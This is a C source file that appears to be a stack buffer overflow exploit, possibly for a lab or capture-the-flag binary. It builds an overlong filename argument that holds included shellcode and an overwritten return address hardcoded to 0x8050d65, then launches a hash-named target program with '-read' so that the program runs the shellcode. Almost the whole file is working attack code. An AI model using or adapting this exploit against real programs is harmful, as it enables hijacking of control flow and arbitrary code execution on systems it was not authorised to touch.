#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = {
#include "stack-shellcode.h"
};

/* Address of shellcode in .globals */
#define START	0x8050d65;

int main(void)
{
	struct _overflow {
		/* Overflow filename with shellcode */
		char filename[4];
		char dot; // Required dot
		char shellcode[50]; // Include shellcode as extension
		uint32_t ret; // Return address to be overwritten
		unsigned char nul;  /* terminate string */
	} __attribute__((packed)) overflow;

	memset(&overflow, 'A', sizeof(overflow));
	overflow.dot = '.';
	memcpy(overflow.shellcode,shellcode,sizeof(shellcode));

	overflow.ret = START;
	overflow.nul = '\0';

	char *argv[] = { 	"./c4288bb0f38c68dd2258b0b941ccbb4534e286d5",
						"-read",
						(char*)&overflow,
						NULL };

	execve(argv[0], argv, NULL);

	return EXIT_FAILURE;
}